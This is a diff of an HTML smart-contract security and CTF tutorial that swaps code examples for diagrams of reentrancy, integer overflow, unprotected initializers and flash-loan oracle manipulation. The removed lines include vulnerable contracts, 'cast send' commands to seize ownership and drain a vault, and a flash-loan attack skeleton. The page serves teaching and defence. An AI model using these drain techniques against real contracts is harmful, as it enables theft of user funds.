+          <div style="background:#050510;border:1px solid rgba(255,215,0,0.3);border-radius:4px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--yellow);">④ balance NOT updated yet<br><span style="font-size:9px;color:var(--pink);">← state update is here</span></div>
+          <div style="border-left:2px dashed var(--yellow);margin-left:50%;height:14px;"></div>
+          <div style="background:rgba(255,215,0,0.08);border:1px dashed var(--yellow);border-radius:4px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--yellow);">balance = 0 (too late!)</div>
+        </div>
+      </div>
+      <!-- CEI fix -->
+      <div style="margin-top:14px;display:flex;gap:10px;align-items:center;background:#050510;border:1px solid rgba(0,255,136,0.3);border-radius:6px;padding:10px 16px;flex-wrap:wrap;">
+        <span style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);">✅ FIX — CEI Pattern:</span>
+        <span style="background:rgba(255,45,120,0.1);border:1px solid var(--pink);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--pink);">① Check</span>
+        <span style="color:var(--muted);">→</span>
+        <span style="background:rgba(0,245,255,0.1);border:1px solid var(--cyan);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--cyan);">② Effect (update state)</span>
+        <span style="color:var(--muted);">→</span>
+        <span style="background:rgba(0,255,136,0.1);border:1px solid var(--green);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);">③ Interact (send ETH)</span>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -1084,18 +1282,54 @@
         </ul>
       </div>
     </div>
-    <pre><span class="cm">// ❌ Vulnerable (Solidity 0.6.x)</span>
-<span class="kw">contract</span> <span class="fn">TimeLock</span> {
-  <span class="kw">mapping</span>(<span class="kw">address</span> <span class="op">=&gt;</span> <span class="kw">uint</span>) <span class="kw">public</span> <span class="var">lockTime</span>;
-  <span class="kw">function</span> <span class="fn">increaseLockTime</span>(<span class="kw">uint</span> <span class="var">secs</span>) <span class="kw">public</span> {
-    lockTime[msg.sender] <span class="op">+=</span> secs;   <span class="cm">// overflow: pass 2^256 - lockTime to wrap to 0</span>
-  }
-}
-
-<span class="cm">// Exploit: calculate overflow amount in Python</span>
-<span class="fn">overflow_amount</span> = <span class="num">2</span><span class="op">**</span><span class="num">256</span> <span class="op">-</span> current_lock_time
-<span class="cm">// Call increaseLockTime(overflow_amount) → lockTime becomes 0 → withdraw!</span>
-</pre>
+    <!-- Overflow number line diagram -->
+    <div style="width:100%;max-width:900px;">
+      <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:10px;">▶ UINT8 OVERFLOW / UNDERFLOW VISUALISED</div>
+      <!-- Overflow -->
+      <div style="background:#050510;border:1px solid rgba(255,107,53,0.3);border-radius:8px;padding:14px 18px;margin-bottom:10px;">
+        <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--orange);margin-bottom:10px;">OVERFLOW — uint8(255) + 1</div>
+        <div style="position:relative;height:36px;">
+          <div style="position:absolute;left:0;right:0;top:50%;height:3px;background:linear-gradient(90deg,var(--orange),var(--pink));"></div>
+          <div style="position:absolute;left:0;top:0;text-align:center;">
+            <div style="background:rgba(0,255,136,0.2);border:1px solid var(--green);border-radius:4px;padding:2px 8px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);">0</div>
+          </div>
+          <div style="position:absolute;left:50%;transform:translateX(-50%);top:0;text-align:center;">
+            <div style="background:rgba(0,245,255,0.15);border:1px solid var(--cyan);border-radius:4px;padding:2px 8px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--cyan);">128</div>
+          </div>
+          <div style="position:absolute;right:0;top:0;text-align:center;">
+            <div style="background:rgba(255,107,53,0.2);border:1px solid var(--orange);border-radius:4px;padding:2px 8px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--orange);">255</div>
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:10px;margin-top:14px;flex-wrap:wrap;">
+          <span style="background:rgba(255,107,53,0.15);border:1px solid var(--orange);border-radius:4px;padding:4px 12px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--orange);">255</span>
+          <span style="color:var(--pink);font-size:18px;">+ 1</span>
+          <span style="color:var(--muted);font-size:18px;">→</span>
+          <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--muted);">wraps around</span>
+          <span style="color:var(--muted);font-size:18px;">→</span>
+          <span style="background:rgba(0,255,136,0.2);border:2px solid var(--green);border-radius:4px;padding:4px 12px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--green);">0 ⚠️</span>
+        </div>
+      </div>
+      <!-- Underflow -->
+      <div style="background:#050510;border:1px solid rgba(168,85,247,0.3);border-radius:8px;padding:14px 18px;">
+        <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--purple);margin-bottom:10px;">UNDERFLOW — uint256(0) - 1</div>
+        <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+          <span style="background:rgba(168,85,247,0.15);border:1px solid var(--purple);border-radius:4px;padding:4px 12px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--purple);">balance = 0</span>
+          <span style="color:var(--pink);font-size:16px;">- large amount</span>
+          <span style="color:var(--muted);font-size:16px;">→</span>
+          <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--muted);">wraps to max</span>
+          <span style="color:var(--muted);font-size:16px;">→</span>
+          <span style="background:rgba(255,45,120,0.15);border:2px solid var(--pink);border-radius:4px;padding:4px 12px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--pink);">2²⁵⁶−1 ≈ ∞ ⚠️</span>
+        </div>
+        <div style="margin-top:10px;display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+          <span style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);">CTF exploit:</span>
+          <span style="background:rgba(255,107,53,0.1);border:1px solid var(--orange);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--orange);">lockTime = N</span>
+          <span style="color:var(--muted);">→</span>
+          <span style="background:rgba(0,245,255,0.1);border:1px solid var(--cyan);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--cyan);">add(2²⁵⁶ − N)</span>
+          <span style="color:var(--muted);">→</span>
+          <span style="background:rgba(0,255,136,0.15);border:1px solid var(--green);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);">lockTime = 0 → withdraw!</span>
+        </div>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -1127,27 +1361,61 @@
         </ul>
       </div>
     </div>
-    <pre><span class="cm">// ❌ VULNERABLE — no access control</span>
-<span class="kw">contract</span> <span class="fn">Vault</span> {
-  <span class="kw">address public</span> <span class="var">owner</span>;
-  <span class="kw">function</span> <span class="fn">initialize</span>(<span class="kw">address</span> <span class="var">_owner</span>) <span class="kw">public</span> {   <span class="cm">// ← no initializer guard!</span>
-    owner = _owner;
-  }
-  <span class="kw">function</span> <span class="fn">withdrawAll</span>() <span class="kw">public</span> {                   <span class="cm">// ← missing onlyOwner!</span>
-    payable(msg.sender).<span class="fn">transfer</span>(<span class="kw">address</span>(<span class="kw">this</span>).balance);
-  }
-}
-
-<span class="cm">// ✅ EXPLOIT — call initialize again, then drain</span>
-<span class="fn">cast</span> send &lt;addr&gt; <span class="str">"initialize(address)"</span> $ATTACKER --private-key $PK
-<span class="fn">cast</span> send &lt;addr&gt; <span class="str">"withdrawAll()"</span> --private-key $PK
-
-<span class="cm">// ✅ FIX</span>
-<span class="kw">bool private</span> <span class="var">initialized</span>;
-<span class="kw">function</span> <span class="fn">initialize</span>(<span class="kw">address</span> <span class="var">_owner</span>) <span class="kw">public</span> {
-  <span class="kw">require</span>(!initialized, <span class="str">"already init"</span>);
-  initialized = <span class="kw">true</span>; owner = _owner;
-}</pre>
+    <!-- Access Control attack diagram -->
+    <div style="width:100%;max-width:900px;">
+      <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:10px;">▶ UNPROTECTED INITIALIZER EXPLOIT FLOW</div>
+      <div style="display:flex;gap:0;align-items:stretch;flex-wrap:wrap;justify-content:center;">
+        <div style="background:rgba(255,45,120,0.1);border:1px solid var(--pink);border-radius:8px 0 0 8px;padding:12px 16px;min-width:130px;text-align:center;">
+          <div style="font-size:22px;">😈</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--pink);">ATTACKER</div>
+        </div>
+        <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;padding:0 8px;">
+          <div style="color:var(--pink);font-size:16px;">→</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--pink);white-space:nowrap;">initialize(attacker)</div>
+        </div>
+        <div style="background:#0d0d1a;border:1px solid rgba(0,245,255,0.3);padding:12px 16px;min-width:150px;text-align:center;">
+          <div style="font-size:22px;">📄</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--cyan);">CONTRACT</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);margin-top:4px;">no initialized guard</div>
+          <div style="background:rgba(255,215,0,0.1);border:1px solid var(--yellow);border-radius:4px;padding:4px 6px;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--yellow);margin-top:6px;">owner = attacker ✓</div>
+        </div>
+        <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;padding:0 8px;">
+          <div style="color:var(--green);font-size:16px;">→</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--green);white-space:nowrap;">now owner</div>
+        </div>
+        <div style="background:#0d0d1a;border:1px solid rgba(168,85,247,0.3);padding:12px 16px;min-width:150px;text-align:center;">
+          <div style="font-size:22px;">🔓</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--purple);">CALL withdrawAll()</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);margin-top:4px;">no onlyOwner check</div>
+        </div>
+        <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;padding:0 8px;">
+          <div style="color:var(--green);font-size:16px;">→</div>
+        </div>
+        <div style="background:rgba(0,255,136,0.1);border:2px solid var(--green);border-radius:0 8px 8px 0;padding:12px 16px;min-width:110px;text-align:center;">
+          <div style="font-size:22px;">🏁</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--green);">DRAINED</div>
+        </div>
+      </div>
+      <!-- visibility bug table -->
+      <div style="margin-top:14px;display:grid;grid-template-columns:repeat(4,1fr);gap:8px;">
+        <div style="background:rgba(0,255,136,0.08);border:1px solid rgba(0,255,136,0.3);border-radius:6px;padding:8px;text-align:center;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);">public</div>
+          <div style="font-size:9px;color:var(--muted);margin-top:4px;">anyone calls</div>
+        </div>
+        <div style="background:rgba(0,245,255,0.08);border:1px solid rgba(0,245,255,0.3);border-radius:6px;padding:8px;text-align:center;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--cyan);">external</div>
+          <div style="font-size:9px;color:var(--muted);margin-top:4px;">only outside</div>
+        </div>
+        <div style="background:rgba(168,85,247,0.08);border:1px solid rgba(168,85,247,0.3);border-radius:6px;padding:8px;text-align:center;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--purple);">internal</div>
+          <div style="font-size:9px;color:var(--muted);margin-top:4px;">this + children</div>
+        </div>
+        <div style="background:rgba(255,45,120,0.08);border:1px solid rgba(255,45,120,0.3);border-radius:6px;padding:8px;text-align:center;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--pink);">private</div>
+          <div style="font-size:9px;color:var(--muted);margin-top:4px;">this only</div>
+        </div>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -1179,28 +1447,51 @@
         </ul>
       </div>
     </div>
-    <pre><span class="cm">// Flash Loan Attack skeleton (Aave V2)</span>
-<span class="kw">contract</span> <span class="fn">FlashAttack</span> <span class="kw">is</span> <span class="fn">IFlashLoanReceiver</span> {
-  <span class="fn">ILendingPool</span> <span class="kw">pool</span> = <span class="fn">ILendingPool</span>(<span class="str">AAVE_POOL</span>);
-
-  <span class="kw">function</span> <span class="fn">attack</span>() <span class="kw">external</span> {
-    <span class="kw">address</span>[] <span class="kw">memory</span> <span class="var">assets</span> = <span class="kw">new</span> <span class="kw">address</span>[](<span class="num">1</span>);
-    assets[<span class="num">0</span>] = USDC;
-    <span class="kw">uint256</span>[] <span class="kw">memory</span> <span class="var">amounts</span> = <span class="kw">new</span> <span class="kw">uint256</span>[](<span class="num">1</span>);
-    amounts[<span class="num">0</span>] = <span class="num">1_000_000e6</span>;  <span class="cm">// borrow 1M USDC</span>
-    pool.<span class="fn">flashLoan</span>(<span class="kw">address</span>(<span class="kw">this</span>), assets, amounts, ...);
-  }
-
-  <span class="kw">function</span> <span class="fn">executeOperation</span>(...) <span class="kw">external override returns</span> (<span class="kw">bool</span>) {
-    <span class="cm">// ← exploit happens here with 1M USDC in hand</span>
-    vulnerableProtocol.<span class="fn">drain</span>();          <span class="cm">// manipulate oracle / drain pool</span>
-    USDC.<span class="fn">approve</span>(<span class="kw">address</span>(pool), amounts[<span class="num">0</span>] + premium);
-    <span class="kw">return true</span>;                           <span class="cm">// repay loan</span>
-  }
-}
-
-<span class="cm">// Vulnerable: pool uses spot price as oracle</span>
-<span class="cm">// Attack: inflate price → borrow more than allowed → repay flash loan → profit</span></pre>
+    <!-- Flash Loan single-tx timeline -->
+    <div style="width:100%;max-width:900px;">
+      <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:10px;">▶ EVERYTHING HAPPENS IN ONE TRANSACTION — reverts if repayment fails</div>
+      <div style="position:relative;padding-left:20px;">
+        <!-- vertical line -->
+        <div style="position:absolute;left:28px;top:10px;bottom:10px;width:2px;background:linear-gradient(180deg,var(--purple),var(--cyan),var(--green));"></div>
+        <!-- steps -->
+        <div style="display:flex;flex-direction:column;gap:10px;">
+          <div style="display:flex;gap:14px;align-items:center;">
+            <div style="width:18px;height:18px;border-radius:50%;background:var(--purple);display:flex;align-items:center;justify-content:center;font-family:'Orbitron',monospace;font-size:9px;color:#000;flex-shrink:0;">1</div>
+            <div style="background:#0d0d1a;border:1px solid rgba(168,85,247,0.4);border-radius:6px;padding:8px 14px;flex:1;">
+              <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--purple);">Borrow 1M USDC</span>
+              <span style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);margin-left:10px;">from Aave / dYdX — no collateral needed</span>
+            </div>
+          </div>
+          <div style="display:flex;gap:14px;align-items:center;">
+            <div style="width:18px;height:18px;border-radius:50%;background:var(--pink);display:flex;align-items:center;justify-content:center;font-family:'Orbitron',monospace;font-size:9px;color:#000;flex-shrink:0;">2</div>
+            <div style="background:#0d0d1a;border:1px solid rgba(255,45,120,0.4);border-radius:6px;padding:8px 14px;flex:1;">
+              <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--pink);">Manipulate Spot Price Oracle</span>
+              <span style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);margin-left:10px;">dump or buy huge amounts → oracle reads wrong price</span>
+            </div>
+          </div>
+          <div style="display:flex;gap:14px;align-items:center;">
+            <div style="width:18px;height:18px;border-radius:50%;background:var(--orange);display:flex;align-items:center;justify-content:center;font-family:'Orbitron',monospace;font-size:9px;color:#000;flex-shrink:0;">3</div>
+            <div style="background:#0d0d1a;border:1px solid rgba(255,107,53,0.4);border-radius:6px;padding:8px 14px;flex:1;">
+              <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--orange);">Exploit Mispriced Protocol</span>
+              <span style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);margin-left:10px;">borrow under-collateralised / drain liquidity pool</span>
+            </div>
+          </div>
+          <div style="display:flex;gap:14px;align-items:center;">
+            <div style="width:18px;height:18px;border-radius:50%;background:var(--cyan);display:flex;align-items:center;justify-content:center;font-family:'Orbitron',monospace;font-size:9px;color:#000;flex-shrink:0;">4</div>
+            <div style="background:#0d0d1a;border:1px solid rgba(0,245,255,0.4);border-radius:6px;padding:8px 14px;flex:1;">
+              <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--cyan);">Repay Flash Loan + Fee</span>
+              <span style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);margin-left:10px;">must happen in same tx or everything reverts</span>
+            </div>
+          </div>
+          <div style="display:flex;gap:14px;align-items:center;">
+            <div style="width:18px;height:18px;border-radius:50%;background:var(--green);display:flex;align-items:center;justify-content:center;font-family:'Orbitron',monospace;font-size:9px;color:#000;flex-shrink:0;">5</div>
+            <div style="background:rgba(0,255,136,0.1);border:2px solid var(--green);border-radius:6px;padding:8px 14px;flex:1;">
+              <span style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--green);">🏁 Keep Profit — Tx Confirmed</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
     <div class="grid-2" style="margin-top:4px;">
       <div class="card green">
         <h3 style="color:var(--green);">Common CTF Targets</h3>
